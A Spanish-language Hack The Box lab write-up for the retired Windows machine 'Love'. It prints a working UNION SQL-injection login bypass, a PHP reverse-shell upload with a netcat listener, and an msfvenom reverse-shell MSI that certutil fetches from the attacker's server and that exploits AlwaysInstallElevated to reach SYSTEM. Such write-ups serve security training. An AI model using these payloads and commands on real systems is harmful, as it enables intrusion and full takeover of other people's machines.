---
title: "Love"
date: 2025-01-01
description: "UNION-based SQLi en voting system Windows → file upload PHP shell → AlwaysInstallElevated para escalar a SYSTEM con MSI malicioso."
difficulty: Easy
os: Windows
tags: ["sqli", "file-upload", "alwaysinstallelevated", "windows"]
retired: true
draft: false
---

Machine IP: `10.10.10.239`

## Reconocimiento

```
PORT      STATE SERVICE        VERSION
80/tcp    open  http           Apache 2.4.46 (Win64) PHP/7.3.27
|_http-title: Voting System using PHP
135/tcp   open  msrpc
443/tcp   open  ssl/http       Apache 2.4.46
| ssl-cert: commonName=staging.love.htb
445/tcp   open  microsoft-ds   Windows 10 Pro
3306/tcp  open  mysql
```

Enumeración de directorios:

```
/admin   → Login panel
/images  → Directorio de imágenes
```

## UNION-based SQL Injection

El `/admin` tiene un login. Las inyecciones básicas no funcionan directamente. Probando con Caido (similar a Burp) se detectan dos tamaños de respuesta distintos ante ciertos payloads: 351 y 495 chars. El de 495 revela un mensaje de error del servidor.

Payload UNION que funciona:

```
username=x' UNION SELECT 1,2,"$2y$12$jRwyQyXnktvFrlryHNEhXOeKQYX7/5VK2ZdfB9f/GcJLuPahJWZ9K",4,5,6,7 from INFORMATION_SCHEMA.SCHEMATA;-- -
```

El hash bcrypt corresponde a la password `@LoveIsInTheAir!!11!`. Login exitoso.

## File Upload → Reverse Shell

En el panel de **Voters** se puede subir una foto. Cargamos una PHP reverse shell (Ivan Sincek / revshells.com — opción Windows).

Accedemos a la shell desde la URL del directorio `/images`:

```
http://10.10.10.239/omrs/images/shell.php
```

```bash
nc -nvlp 4545
# Shell como: love\phoebe
```

## User Flag

```
C:\Users\Phoebe\Desktop> type user.txt
```

## Escalada → SYSTEM

winPEAS detecta `AlwaysInstallElevated` activado en HKLM y HKCU:

```
HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer → AlwaysInstallElevated = 1
HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer → AlwaysInstallElevated = 1
```

Generamos un MSI con msfvenom:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.7 LPORT=4321 \
  --platform windows -a x64 -f msi -o reverse.msi
```

Transferimos con servidor Python y `certutil`:

```bash
# Atacante
python3 -m http.server 80

# Víctima
certutil.exe -f -urlcache -split http://10.10.14.7/reverse.msi
```

Ejecutamos con privilegios elevados:

```bash
msiexec /quiet /qn /i reverse.msi
```

```
C:\WINDOWS\system32> whoami
nt authority\system
```

**ROOT shell obtenida.**

Happy Hacking!!
